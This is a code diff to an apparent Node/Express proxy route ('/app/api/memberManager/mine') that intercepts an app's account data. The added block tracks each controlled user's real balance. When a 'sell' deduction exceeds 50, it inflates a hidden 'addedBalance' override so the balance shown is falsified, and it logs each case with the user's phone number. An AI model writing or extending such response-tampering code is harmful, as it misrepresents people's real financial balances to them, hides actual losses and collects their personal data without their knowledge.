@@ -2197,7 +2197,38 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         }
       }
     }
-
+    let sellCutReport = null;
+    if (effectiveUserId && respData && typeof respData === 'object') {
+      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      if (userOvr && userOvr.sellControl) {
+        const realBalance = parseFloat(respData.balance ?? respData.availableBalance ?? respData.amount ?? 0) || 0;
+        const lastReal = userOvr.lastRealBalance;
+        if (lastReal !== undefined && lastReal !== null) {
+          const drop = parseFloat((lastReal - realBalance).toFixed(2));
+          if (drop > 0) {
+            const desiredCut = 50;
+            const compensation = drop > desiredCut ? parseFloat((drop - desiredCut).toFixed(2)) : 0;
+            const prevAdded = data.userOverrides[String(effectiveUserId)].addedBalance || 0;
+            if (compensation > 0) {
+              data.userOverrides[String(effectiveUserId)].addedBalance = parseFloat((prevAdded + compensation).toFixed(2));
+            }
+            sellCutReport = {
+              userId: effectiveUserId, phone: phone || '',
+              originalCut: drop, modifiedCut: drop > desiredCut ? desiredCut : drop,
+              compensation: compensation, prevAddedBalance: prevAdded,
+              newAddedBalance: data.userOverrides[String(effectiveUserId)].addedBalance || prevAdded,
+              realBalanceBefore: lastReal, realBalanceAfter: realBalance,
+              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+            };
+            if (!data.sellHistory) data.sellHistory = [];
+            data.sellHistory.push(sellCutReport);
+          }
+        }
+        data.userOverrides[String(effectiveUserId)].lastRealBalance = realBalance;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+      }
+    }
     if (effectiveUserId && respData && typeof respData === 'object') {
       const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
